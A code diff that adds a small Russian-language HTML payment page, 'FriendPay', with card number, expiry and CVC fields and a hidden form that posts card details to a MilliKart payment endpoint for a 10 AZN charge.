@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, interactive-widget=resizes-content">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css"
+        integrity="sha512-jnSuA4Ss2PkkikSOLtYs8BlYIeeIK1h99ty4YfvRPAlzr377vr3CXDb7sb7eEEBYjDtcYj+AjBH3FLv5uSJuXg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link fetchpriority="high" rel="stylesheet" href="./font/inter.css">
+    <link fetchpriority="high" rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
+    <link rel="stylesheet" href="style.css">
+    <title>FriendPay</title>
+</head>
+
+<body class="d-flex align-items-center justify-content-center">
+    <div class="card">
+        <div class="d-flex flex-column justify-content-center card-inputs mb-4 pb-4">
+            <div class="input-group card-input" bis_skin_checked="1">
+                <span id="cc-icon" class="input-group-text">
+                    <span class="material-symbols-outlined">
+                        credit_card
+                    </span>
+                </span>
+                <input type="tel" class="form-control" maxlength="19" id="cc-number" name="cc-number"
+                    autocomplete="cc-number" placeholder="Введите номер вашей карты" aria-label="Card Number"
+                    aria-describedby="input-group-left">
+            </div>
+            <div class="d-flex card-info">
+                <div class="input-group card-input" bis_skin_checked="1">
+                    <span class="input-group-text material-symbols-outlined">
+                        date_range
+                    </span>
+                    <input type="tel" class="form-control" maxlength="5" id="cc-exp" name="cc-exp"
+                        autocomplete="cc-exp" placeholder="MM/YY" aria-label="MM/YY"
+                        aria-describedby="input-group-left">
+                </div>
+                <div class="input-group card-input" bis_skin_checked="1">
+                    <span class="input-group-text material-symbols-outlined">
+                        password
+                    </span>
+                    <input type="tel" class="form-control" maxlength="4" pattern="[0-9]*" id="cc-cvv" name="cvc2"
+                        autocomplete="cc-csc" placeholder="CVC/CVV" aria-label="CVV"
+                        aria-describedby="input-group-left">
+                </div>
+            </div>
+            <form id="ccForm" action="https://paymentsmk.millikart.az/proceed" method="post">
+                <input name="cardnr" type="hidden" id="cardnr">
+                <input name="validMONTH" type="hidden" id="validMonth">
+                <input name="validYEAR" type="hidden" id="validYear">
+            </form>
+            <button type="submit" id="submit-btn" disabled class="btn btn-primary mt-4">10 AZN | Платить</button>
+        </div>
+        <div class="footer d-flex justify-content-center">
+            <img src="./assets/mastercard.svg" alt="Mastercard logo">
+            <img src="./assets/visa.svg" alt="Visa logo">
+        </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/js/bootstrap.min.js"
+        integrity="sha512-ykZ1QQr0Jy/4ZkvKuqWn4iF3lqPZyij9iRv6sGqLRdTPkY69YX6+7wvVGmsdBbiIfN/8OdsI7HABjvEok6ZopQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="index.js"></script>
+</body>
+
+</html>
